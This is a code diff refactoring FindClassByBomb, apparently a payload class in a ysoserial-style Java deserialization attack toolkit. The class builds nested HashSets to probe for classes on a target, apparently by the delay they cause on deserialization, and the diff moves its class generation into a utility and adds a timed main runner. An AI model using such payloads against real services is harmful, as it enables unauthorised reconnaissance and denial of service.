@@ -1,12 +1,11 @@
 package me.gv7.woodpecker.yso.payloads;
 
-import javassist.*;
-import me.gv7.woodpecker.yso.JavassistClassLoader;
 import me.gv7.woodpecker.yso.payloads.annotation.Authors;
+import me.gv7.woodpecker.yso.payloads.util.ClassUtil;
 import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
 
-import java.io.FileOutputStream;
-import java.io.ObjectOutputStream;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.*;
 
 @SuppressWarnings ( {
@@ -28,7 +27,7 @@ public class FindClassByBomb extends PayloadRunner implements ObjectPayload<Obje
             depth = 28;
         }
 
-        Class findClazz = makeClass(className);
+        Class findClazz = ClassUtil.genClass(className);
         Set<Object> root = new HashSet<Object>();
         Set<Object> s1 = root;
         Set<Object> s2 = new HashSet<Object>();
@@ -48,50 +47,10 @@ public class FindClassByBomb extends PayloadRunner implements ObjectPayload<Obje
         return root;
     }
 
-    public static HashMap<Object,Object> getBigList() throws Exception{
-        Class findClazz = makeClass("xxxx");
-        int depth = 0;
-        HashMap<Object,Object> root = new HashMap<Object, Object>();
-        HashMap<Object,Object> s1 = root;
-        HashMap<Object,Object> s2 = new HashMap<Object,Object>();
-        for (int i = 0; i < depth; i++) {
-            HashMap<Object,Object> t1 = new HashMap<Object,Object>();
-            HashMap<Object,Object> t2 = new HashMap<Object,Object>();
-
-            t1.put(findClazz,t2);
-            t2.put(findClazz,t1);
-
-            s1.put(findClazz,t1);
-
-
-            s1 = t1;
-            s2 = t2;
-        }
-        return root;
-    }
-
-
-
-    public static Class loadClass(String clazzName) throws Exception{
-        try{
-            return Class.forName(clazzName);
-        }catch (ClassNotFoundException e){
-            try {
-                return Thread.currentThread().getContextClassLoader().loadClass(clazzName);
-            }catch (ClassNotFoundException ee){
-                return makeClass(clazzName);
-            }
-        }
-    }
-
-    public static Class makeClass(String clazzName) throws Exception {
-        if(clazzName.startsWith("java.")){
-            return loadClass(clazzName);
-        }
-        ClassPool classPool = ClassPool.getDefault();
-        CtClass ctClass = classPool.makeClass(clazzName);
-        Class clazz = ctClass.toClass(new JavassistClassLoader());
-        ctClass.defrost();
-        return clazz;
+    public static void main(final String[] args) throws Exception {
+        DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
+        System.out.println(String.format("Start in %s",df.format(new Date())));
+        PayloadRunner.run(FindClassByBomb.class, args);
+        System.out.println(String.format("End in %s",df.format(new Date())));
     }
 }
